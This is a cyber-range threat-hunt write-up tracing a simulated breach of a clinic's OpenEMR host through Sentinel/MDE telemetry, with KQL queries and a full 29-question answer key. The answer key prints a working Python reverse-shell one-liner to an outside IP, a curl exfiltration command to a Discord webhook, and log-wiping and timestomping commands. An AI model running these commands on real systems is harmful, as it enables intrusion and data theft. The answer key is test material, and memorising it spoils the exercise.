# Hunt 07 — Rocky Clinic OpenEMR Breach
**Project:** Project Basilio — LOGN Pacific Cyber Range Hunt Sequence (Hunts 03–07, "Silent Corridor")
**Date:** June 2026
**Stage:** Advanced Analyst Work — Threat Hunt / IR
**Platform:** Microsoft Sentinel (workspace: `LAW-Cyber-Range`), KQL, Microsoft Defender for Endpoint (Linux MDE)
**Analyst:** Basilio Thrasher
**MITRE ATT&CK:** T1078 (Valid Accounts) · T1543.002 (Systemd Service) · T1548.003 (Sudo) · T1136.001 (Create Account: Local) · T1613 (Container and Resource Discovery) · T1552.001 (Credentials in Files) · T1074.001 (Local Data Staging) · T1059.006 (Python) · T1573 (Encrypted Channel) · T1567 (Exfiltration Over Web Service) · T1070.004 (Indicator Removal: File Deletion) · T1070.006 (Timestomp)

---

## Objective
Investigate a suspected breach of Rocky Clinic's OpenEMR (electronic health records) platform, hosted on a Dockerized RockyLinux host, to reconstruct the full attacker kill chain — initial access through cleanup — and determine what patient data, if any, left the environment.

## Problem Statement
OpenEMR hosts protected health information (PHI), so a confirmed breach carries HIPAA notification exposure on top of standard IR concerns. The hunt required proving each stage of the attack strictly from EDR/SIEM telemetry — no assumptions — closing 29 flags across 8 investigative phases, two of which (Q19, Q21) required working around real MDE telemetry gaps rather than guessing.

## Environment
- **Host:** `rocky83` (short hostname) / `rocky83.a25bvds0ldetcy60khu05hda.cx.internal.cloudapp.net` (full FQDN)
- **OS:** RockyLinux (RHEL family)
- **Application stack:** OpenEMR on Docker; database container `openemr-mariadb`; Docker project ID `r0ckyyyy335`
- **SIEM:** Microsoft Sentinel, `LAW-Cyber-Range`
- **EDR:** Linux MDE — deployment was mid-rollout on this host *during* the attack window, producing real telemetry gaps
- **Primary tables:** `DeviceInfo`, `DeviceLogonEvents`, `DeviceProcessEvents`, `DeviceFileEvents`, `DeviceNetworkEvents`, `DeviceEvents`, `AlertEvidence`
- **Investigation window:** Feb 4–14, 2026 UTC

## Attack Timeline

| Time (UTC) | Event |
|---|---|
| 2/6 8:25 PM | `sudo -i` — attacker escalates to root |
| 2/6 8:26–8:29 PM | `docker inspect openemr-app` then `docker inspect openemr-mariadb` — container mapping |
| 2/7 3:34 AM | `system` account planted via direct `/etc/passwd` edit (`vipw`) — no `useradd` footprint |
| 2/8 4:25–4:39 PM | Primary suspicious session, external IP `37.19.221.234` — 14 minutes, ends when a second external IP appears |
| 2/10 5:07:15 PM | `integration-monitor.service` written via `cat` heredoc (root) |
| 2/10 5:07:22 PM | `chmod 644` + `systemctl daemon-reload` on the new service |
| 2/10 ~9:48 PM | Service fires for the first time — local health-check curl |
| 2/11 4:16 AM | Service file modified via `vim` (it.admin) — **armed** version, immediately followed by `systemctl enable` + `systemctl start` |
| 2/11 4:18 AM | Reverse shell connects, `/bin/sh -i` spawned — PID **8000** (MDE fully operational at this point) |
| 2/11 8:28:59 PM | Second reverse shell execution, PID 6951 (MDE mid-install — child shell not captured) |
| 2/11 8:29:16 PM | `cat /etc/passwd` — PID 7020 |
| 2/11 8:31:31 PM | Third reverse shell execution, PID 7741 |
| 2/11 ~8:32 PM | SFTP-over-SSH attempt to `20.62.27.80` as user `streetrack` — **blocked** by network controls |
| 2/11 ~8:32 PM | `ssh it.admin@rocky83` back into the box from the reverse shell — PID 7786 |
| 2/11 ~8:32 PM | `curl` to Discord webhook — **successful exfiltration** of staged archive |
| 2/11 4:13 PM* | 12x `sed -i` log deletions begin across `/var/log/secure` and `/var/log/messages` |
| 2/11 4:47 PM* | `touch -d "2026-02-06 12:00:00" /var/log/messages` — backdates the log file 5 days |

\*Cleanup phase timestamps use the 24-hour times from the query windows (16:13–16:47 UTC); listed here in order relative to the rest of the day's activity.

## Solution / Steps Taken (by phase)

**Phase 1 — Asset Validation.** Filtered `DeviceInfo` to Linux hosts, visually identified `rocky83` from 134 candidates, confirmed against `docker`/`openemr` process activity.

**Phase 2 — Discovery.** Grouped `DeviceLogonEvents` by external IP for `it.admin` to isolate the anomalous `37.19.221.234` session (count of 1, vs. 27 for the routine admin IP). Anchored all process hunting to the resulting 14-minute session boundary — established *before* touching process data, which became the standing rule for the rest of the hunt.

**Phase 3 — Privilege Escalation.** Found `sudo -i` as the escalation command, then traced `docker inspect openemr-mariadb` and a credential-bearing `.env` file read (`cat /etc/openemr/audit_export.env`) that gave the attacker the OpenEMR database password without any brute-force footprint.

**Phase 4 — Staging.** Identified `/opt/backup/scripts/backup_manifest.sh` — a legitimate scheduled backup script — hijacked to stage data, with output collected in `/var/lib/backup` to blend in with routine system paths.

**Phase 5 — Persistence.** Two persistence mechanisms: an unauthorized `system` account planted via direct `/etc/passwd` editing (`vipw`, no `useradd` telemetry), found by grouping logon counts per account and flagging the one system-looking account that also had external-IP logons; and `integration-monitor.service`, a systemd unit created with a bare `cat` heredoc (no editor telemetry).

**Phase 6 — Command and Control.** Recovered the full python3 reverse shell one-liner connecting to `20.62.27.80:443`, launched by the systemd service. Resolving the interactive `/bin/sh -i` PID (Q21) and the "armed" pre-activation service file hash (Q19) required working through a real MDE telemetry gap — see Challenges.

**Phase 7 — Exfiltration.** Found a blocked structured-transfer attempt first — an SFTP-over-SSH command to `20.62.27.80`, run under a distinct account (`streetrack`, not `it.admin`) and stopped by network controls — followed by the operator pivoting to a successful `curl` upload of the staged archive to a Discord webhook, landing on `162.159.135.232:443`.

**Phase 8 — Defense Evasion.** Counted 12 distinct `sed -i` deletions against `/var/log/secure` and `/var/log/messages`, plus a `touch -d` command backdating `/var/log/messages` by 5 days. Confirmed via `AlertEvidence` correlation, which classified the activity as Indicator Removal (T1070) / Timestomp (T1070.006).

## Key Findings — Full Answer Key

| Q | Finding | Answer |
|---|---|---|
| 01 | Host FQDN | `rocky83.a25bvds0ldetcy60khu05hda.cx.internal.cloudapp.net` |
| 02 | Container runtime | `docker` |
| 03 | First recon command PID | `17507` (`w`, run 5 sec after suspicious logon) |
| 04 | Docker binary SHA256 | `a7b78f3f501951ccb4555697ef1b6dc1832ae42e9433926a8504c6aef719c729d` |
| 05 | Attacker account | `it.admin` |
| 06 | OS release files read | `4` (Linux ecosystem knowledge — not directly in telemetry) |
| 07 | OS distribution | `RockyLinux` |
| 08 | Privilege escalation | `sudo -i` |
| 09 | Container interrogation | `docker inspect openemr-mariadb` |
| 10 | Credential file read | `cat /etc/openemr/audit_export.env` |
| 11 | Volume enumeration | `find /var/lib/docker/volumes -maxdepth 3 -type f` |
| 12 | DB storage path | `/var/lib/docker/volumes/r0ckyyyy335_mariadb_data/_data` |
| 13 | Hijacked script | `/opt/backup/scripts/backup_manifest.sh` |
| 14 | Staging directory | `/var/lib/backup` |
| 15 | Unauthorized account | `system` |
| 16 | Account-creation binary SHA256 | `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0` (`vipw`) |
| 17 | Persistence mechanism | `integration-monitor.service` |
| 18 | No-editor file creation | `cat` |
| 19 | Armed service file SHA256 | `f71ea834a9be9fb0e90c7b496e5312072ffedf1d1c0377957e05714bdac37b8` |
| 20 | C2 command | `/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("20.62.27.80",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| 21 | Interactive shell PID | `8000` |
| 22 | Staged archive | `integration_state_2026-02-10_22-00-01.tar.gz` |
| 23 | Failed transfer initiating command | `/usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l streetrack -s -- 20.62.27.80 sftp` |
| 24 | Successful exfil command | `curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/...` |
| 25 | Exfil endpoint | `162.159.135.232:443` |
| 26 | Log deletion count | `12` (`sed -i` operations) |
| 27 | Log manipulation binary | `sed` |
| 28 | Forged timestamp | `2026-02-06 12:00:00` |
| 29 | Alert technique | `["Indicator Removal (T1070)","Timestomp (T1070.006)"]` |

## Query Library
Full KQL query library (30+ queries organized by phase, with commentary) is maintained as a companion file: `hunt07_rocky_clinic_kql_library.md`. Representative queries:

**Session boundary (always run first):**
```kql
DeviceLogonEvents
| where DeviceName contains "rocky83"
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where AccountName == "it.admin"
| where not(RemoteIP startswith "10.") and not(RemoteIP startswith "192.168.") and not(RemoteIP startswith "172.")
| summarize LogonCount = count(), FirstSeen = min(Timestamp) by RemoteIP
| order by FirstSeen asc
```

**Persistence file discovery (TimeGenerated + contains, not exact match):**
```kql
let start = datetime('2026-02-10');
let end = datetime('2026-02-15');
DeviceFileEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "rocky83"
| where FolderPath contains "service"
| where ActionType == "FileCreated"
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath,
          InitiatingProcessAccountName, InitiatingProcessCommandLine, SHA256
| order by TimeGenerated asc
```

**Log tampering count:**
```kql
let start = datetime('2026-02-11T16:13:00Z');
let end = datetime('2026-02-11T16:16:00Z');
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "rocky"
| where FileName == "sed"
| where ProcessCommandLine has "/var/log/secure" or ProcessCommandLine has "/var/log/messages"
| project TimeGenerated, ProcessCommandLine, ProcessId
| order by TimeGenerated asc
```

## Challenges and How I Solved Them
- **Exact match vs. substring on `DeviceName`.** Before full MDE deployment the host reported as `rocky83`; after, it reported as the full FQDN. `=~ "rocky83"` (exact match) silently missed every post-deployment event. Fixed by using `contains` for any query spanning the deployment boundary.
- **`TimeGenerated` vs. `Timestamp`.** For events during or shortly after MDE agent instability, `Timestamp` (device-local event time) sometimes lagged or was missing; `TimeGenerated` (ingestion time) was the reliable field. The 4:16 AM service-arming event on 2/11 only surfaced under `TimeGenerated`.
- **No `FileModified` ActionType.** `DeviceFileEvents` on this host only ever logged `FileCreated`, `FileDeleted`, `FileRenamed` — file edits had to be inferred from the `.sh~`/`.service~` rename-then-recreate pattern rather than a direct modification event.
- **The "armed" service file hash (Q19) and the interactive shell PID (Q21) — the two stuck questions.** Three known hashes for `integration-monitor.service` (creation, chmod binary, systemctl binary) were all wrong for Q19; the fourth attempt, querying `DeviceFileEvents` without a date ceiling and checking for a delete-and-recreate pattern rather than an in-place modify, surfaced the correct armed-state hash. For Q21, the `/bin/sh -i` child of the 8:28:59 PM python3 execution (PID 6951) was never captured — MDE was mid-installation at that exact moment. The breakthrough was recognizing the service had *also* fired earlier, at 4:18 AM on 2/11, once MDE was fully operational, and that this earlier execution's child shell (PID 8000) was the one actually captured in telemetry.
- **SHA256 read from truncated column display.** Cost early attempts on Q16 before establishing the habit of always expanding the row and copying from the full field, not the grid view.
- **`InitiatingProcessSHA256` vs. `SHA256`.** Q16 wanted the hash of the binary that *called* the visible process (`vipw`, via `InitiatingProcessSHA256`), not the hash of the process itself — a distinction worth remembering for any similar "which tool did this" question.

## Open Question
The failed SFTP transfer (Q23) ran under account `streetrack` — the only attacker-controlled action in the entire hunt not attributed to `it.admin` or `system`. Not resolved within the scope of this hunt's questions; worth a follow-up hypothesis (compromised service account vs. attacker-created identity not otherwise flagged) if this environment is revisited.

## Lessons Learned
Establishing logon session boundaries before touching process data was the single highest-leverage habit from this hunt — it eliminated wrong search windows before they could waste attempts. The two stuck questions were both solved not by more queries but by questioning the assumption baked into the earlier queries (assuming one modification event instead of a delete/recreate cycle; assuming the first C2 execution was the only relevant one). "No data" in one table also reliably meant "look in a different table," not "no evidence exists" — true for `DeviceFileEvents` gaps, `AlertEvidence` correlation, and the `InitiatingProcess*` fields throughout.

## Security and SOC Relevance
This hunt is a compact version of a real HIPAA breach investigation: confirm unauthorized access, identify persistence, trace C2, confirm exfiltration scope, and catch anti-forensics — the exact chain needed to make a breach-notification determination. The MDE deployment gap mid-attack is a realistic scenario worth having ready for an interview: partial EDR coverage doesn't mean no evidence, it means correlating across `DeviceEvents`, `AlertEvidence`, and adjacent process/file/network tables until the gap closes.

## Next Steps
Hunt 03 (Signals Before the Noise — external RDP compromise) is next in the sequence, currently at Q12 (RDP-specific auth event count). Hunt 08 (M365/BEC/identity) possible if time allows before the range expires July 25.

## Status: COMPLETE
